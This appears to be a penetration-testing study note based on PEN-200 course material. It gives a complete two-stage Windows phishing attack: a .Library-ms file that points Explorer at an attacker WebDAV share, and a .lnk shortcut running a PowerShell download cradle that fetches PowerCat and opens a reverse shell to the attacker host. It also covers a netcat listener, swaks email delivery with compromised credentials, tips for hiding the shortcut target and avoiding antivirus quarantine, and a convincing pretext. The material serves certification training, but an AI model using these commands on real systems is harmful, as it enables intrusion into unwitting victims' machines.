# Windows Library-ms + LNK

> **PEN-200 Chapter 11.** This is a two-stage client-side attack: a `.Library-ms` file makes an attacker-controlled WebDAV location appear like a normal Explorer directory, then a `.lnk` shortcut in that directory launches a PowerShell / PowerCat reverse shell.

## Attack chain

```text
config.Library-ms
      ↓ victim double-clicks
Windows Explorer opens attacker WebDAV share
      ↓
automatic_configuration.lnk
      ↓ victim double-clicks
PowerShell download cradle
      ↓
powercat.ps1
      ↓
reverse shell
```

The first-stage Library file can be useful when direct links or executable-looking payloads would be more likely to be inspected or filtered.

## 1. Start the WebDAV share on Kali

PEN-200 uses **WsgiDAV**:

```bash
pip3 install wsgidav
mkdir -p /home/kali/webdav
```

If pip fails with an `externally-managed-environment` error, the chapter notes that `--break-system-packages` can be added to the pip command.

Start an anonymous WebDAV share on port 80:

```bash
/home/kali/.local/bin/wsgidav \
  --host=0.0.0.0 \
  --port=80 \
  --auth=anonymous \
  --root /home/kali/webdav/
```

Confirm you can browse the share before building the delivery file.

## 2. Build `config.Library-ms`

Windows Library files are XML and use the `.Library-ms` extension. PEN-200's working template points the Library to the WebDAV URL while using normal Windows library metadata/icon values:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://<LHOST></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Important gotcha — restore the XML after testing

After Windows opens the Library file, it may rewrite the URL from:

```text
http://<LHOST>
```

to a Windows WebDAV path such as:

```text
\\<LHOST>\DavWWWRoot
```

and add a Base64-encoded `serialized` element. PEN-200 warns that this modified version may fail on another machine or after a restart.

**Before delivery, restore the original XML template.** If you test the Library again, restore it again afterward.

## 3. Create the `.lnk` second stage

Create a Windows shortcut whose target launches PowerShell and downloads PowerCat:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/powercat.ps1');powercat -c <LHOST> -p 4444 -e powershell"
```

PEN-200 names the shortcut:

```text
automatic_configuration.lnk
```

Place the `.lnk` in:

```text
/home/kali/webdav/
```

The chapter also notes that a long suspicious shortcut target can be made less obvious in the shortcut-properties display by appending a delimiter and benign-looking command so the suspicious portion is pushed out of the visible area.

## 4. Host PowerCat separately + listen

PEN-200 intentionally serves `powercat.ps1` from a separate HTTP server rather than the writable WebDAV share. A writable share can allow AV/security tooling to remove or quarantine a payload; making it read-only would also remove a useful transfer path.

From the directory containing `powercat.ps1`:

```bash
python3 -m http.server 8000
```

Listener:

```bash
nc -nvlp 4444
```

Keep the WebDAV server running as well.

## 5. Deliver the Library file

Only the `.Library-ms` first stage needs to reach the victim. When it is opened, Explorer presents the remote WebDAV contents like a local folder; the user then runs the `.lnk`, which triggers the PowerShell / PowerCat chain.


## 6. Deliver with authenticated SMTP (`swaks`)

Chapter 24 connects this client-side technique to credentials recovered earlier in the assessment. If you have a valid mailbox/domain identity and the target SMTP service accepts authentication, you can send the `.Library-ms` as the attachment with `swaks`.

Create a short pretext in `body.txt`. Reuse **internal facts already discovered during enumeration** where appropriate; Chapter 24 emphasizes that employee-specific/internal context makes the message more convincing than a generic pretext.

Example:

```bash
sudo swaks \
  -t <USER1>@<DOMAIN> \
  -t <USER2>@<DOMAIN> \
  --from <COMPROMISED_USER>@<DOMAIN> \
  --attach @config.Library-ms \
  --server <MAIL_SERVER> \
  --body @body.txt \
  --header "Subject: <SUBJECT>" \
  --suppress-data \
  -ap
```

`swaks` will prompt for the SMTP username/password when `-ap` is used.

Attack chain:

```text
recovered valid credentials
      ↓
authenticated SMTP
      ↓
Library-ms attachment delivered
      ↓
victim opens Library → WebDAV
      ↓
victim opens LNK
      ↓
PowerCat reverse shell
```

When the shell arrives, immediately establish context:

```powershell
whoami
hostname
ipconfig
systeminfo
```

If the address is on a new internal range, document the subnet/gateway and continue with AD/network enumeration rather than treating the shell as the end goal.

Related: [[Methodology/Assembling the Pieces — End-to-End OSCP Attack Chain|Assembling the Pieces]]

## Quick troubleshooting

```text
Library opens but directory is empty
  → was the file tested already?
  → restore original XML / remove rewritten serialized state
  → verify WebDAV :80 is reachable

LNK opens but no shell
  → verify HTTP :8000 serves powercat.ps1
  → verify nc :4444 is listening
  → verify <LHOST> is reachable from target

Payload disappears from WebDAV
  → AV/security tooling may have quarantined it
  → keep PowerCat on the separate HTTP server as in the PEN-200 workflow
```

Related: [[Client-Side Attack Workflow]] · [[Microsoft Office Macros]]
